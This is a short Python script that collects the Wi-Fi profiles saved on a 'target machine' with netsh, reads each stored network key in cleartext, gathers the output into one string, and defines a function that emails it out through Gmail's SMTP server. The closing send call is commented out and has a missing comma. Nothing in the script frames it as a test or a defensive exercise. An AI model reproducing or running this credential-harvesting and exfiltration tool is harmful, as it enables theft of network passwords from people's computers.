#!/usr/bin/env python
import subprocess, smtplib, re

#======================================
#Initiates smtp server to send email
#======================================
def send_mail(email, psswd, message):
    server = smtplib.SMTP("smtp.gmail.com", 587) #(smtp_server, port)
    server.starttls()
    server.login(email, psswd)
    server.sendmail(email, email, message) #(from, to, email_content)
    server.quit()

 
#======================================
#Run commmands on target machine to gather network data
#======================================
command = 'netsh wlan show profile'

networks = subprocess.check_output(command, shell=True)
networks_string = networks.decode('utf-8')
network_names_list = re.findall(r"(?:Profile\s*:\s)(.*)", networks_string) #list of SSIDs saved on the target machine


#======================================
#Create string from output of gathered network data to send in email 
#======================================

result = '' #string that will contain total captured network info

for name in network_names_list:
    command = f'netsh wlan show profile {name} key=clear'
    current_result = subprocess.check_output(command, shell=True)
    decoded_result = current_result.decode('utf-8')
    result = result + decoded_result




#send_mail(email, password result)
